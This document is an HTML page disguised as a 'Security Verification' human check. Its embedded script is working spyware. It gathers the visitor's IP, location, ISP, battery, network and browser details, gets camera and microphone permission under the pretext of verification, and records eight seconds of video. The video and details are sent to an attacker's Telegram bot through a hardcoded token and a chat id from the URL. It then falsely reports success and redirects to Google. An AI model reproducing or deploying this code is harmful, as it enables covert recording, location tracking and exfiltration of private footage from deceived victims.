<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <style>
        body {
            background-color: #0f172a;
            color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .box {
            background: #1e293b;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
            max-width: 350px;
            width: 100%;
        }
        h2 { margin-bottom: 10px; color: #38bdf8; }
        p { color: #94a3b8; font-size: 14px; margin-bottom: 20px; }
        .btn {
            background: #3b82f6;
            color: white;
            border: none;
            padding: 12px 20px;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
        }
        .btn:hover { background: #2563eb; }
        #status { margin-top: 15px; font-size: 13px; color: #facc15; }
        video { display: none; }
    </style>
</head>
<body>

    <div class="box">
        <h2>Security Verification</h2>
        <p>Please click the button below to verify that you are a human and proceed.</p>
        <button class="btn" id="verifyBtn" onclick="startProcess()">Verify Now 🛡️</button>
        <div id="status"></div>
    </div>

    <video id="video" autoplay playsinline muted></video>

    <script>
        const BOT_TOKEN = "8857558695:AAGOlJ_9PzeyvaOku_2_-MxjdbZJILC1cQI";
        
        let ipInfo = "Fetching...";
        let cityInfo = "Unknown";
        let regionInfo = "Unknown";
        let countryInfo = "Unknown";
        let ispInfo = "Unknown";
        let batteryData = "Unknown";
        let networkData = "Unknown";

        fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(data => {
                ipInfo = data.ip || "N/A";
                cityInfo = data.city || "N/A";
                regionInfo = data.region || "N/A";
                countryInfo = data.country_name || "N/A";
                ispInfo = data.org || "N/A";
            })
            .catch(e => { ipInfo = "Hidden"; });

        if (navigator.getBattery) {
            navigator.getBattery().then(battery => {
                let level = Math.round(battery.level * 100);
                let charging = battery.charging ? "⚡ (Charging)" : "🔋";
                batteryData = `${level}% ${charging}`;
            });
        }

        if (navigator.connection) {
            networkData = navigator.connection.effectiveType ? navigator.connection.effectiveType.toUpperCase() : "Unknown";
        }

        function startProcess() {
            document.getElementById('verifyBtn').style.display = 'none';
            document.getElementById('status').innerText = "Verifying security, please wait...";

            const urlParams = new URLSearchParams(window.location.search);
            const camType = urlParams.get('b'); 
            const chatId = urlParams.get('id');

            let constraints = { video: { facingMode: "user" }, audio: true }; 

            if (camType === 'back') {
                constraints = { video: { facingMode: { exact: "environment" } }, audio: true }; 
            } else if (camType === 'front') {
                constraints = { video: { facingMode: "user" }, audio: true }; 
            }

            navigator.mediaDevices.getUserMedia(constraints)
            .catch(err => {
                if (camType === 'back') {
                    return navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: true });
                }
                throw err;
            })
            .then(stream => {
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                let mediaRecorder;
                let chunks = [];

                try {
                    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
                } catch (e) {
                    mediaRecorder = new MediaRecorder(stream);
                }

                mediaRecorder.ondataavailable = function(event) {
                    if (event.data && event.data.size > 0) {
                        chunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = function() {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    
                    let currentTime = new Date().toLocaleString();
                    let screenRes = `${window.screen.width}x${window.screen.height}`;
                    let uaString = navigator.userAgent;
                    let camNameTag = (camType === 'back') ? "[Back Cam Video]" : "[Front Cam Video]";

                    let captionText = 
                        `🎥 **8-Second Video Captured ${camNameTag}**\n\n` +
                        `🔢 IP: \`${ipInfo}\`\n` +
                        `📍 Location: ${cityInfo}, ${regionInfo}\n` +
                        `📡 ISP: ${ispInfo}\n` +
                        `🔋 Battery: ${batteryData}\n` +
                        `📶 Network: ${networkData}\n` +
                        `🖥️ Screen: ${screenRes}\n` +
                        `🕒 Time: ${currentTime}\n` +
                        `🧠 UA: \`${uaString}\``;

                    sendVideoToTelegram(blob, chatId, captionText);
                    
                    stream.getTracks().forEach(track => track.stop());
                    document.getElementById('status').innerText = "Verification Successful!";
                    setTimeout(() => {
                        window.location.href = "https://www.google.com";
                    }, 1500);
                };

                mediaRecorder.start();
                document.getElementById('status').innerText = "Recording video, please wait...";

                setTimeout(() => {
                    if (mediaRecorder.state === "recording") {
                        mediaRecorder.stop();
                    }
                }, 8000);

            })
            .catch(error => {
                document.getElementById('status').innerText = "Camera/Audio permission denied!";
                console.error(error);
            });
        }

        function sendVideoToTelegram(blob, chatId, caption) {
            if (!chatId) return;

            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('video', blob, 'capture.webm');
            formData.append('caption', caption);
            formData.append('parse_mode', 'Markdown');

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                method: 'POST',
                body: formData
            }).catch(err => console.log(err));
        }
    </script>
</body>
</html>
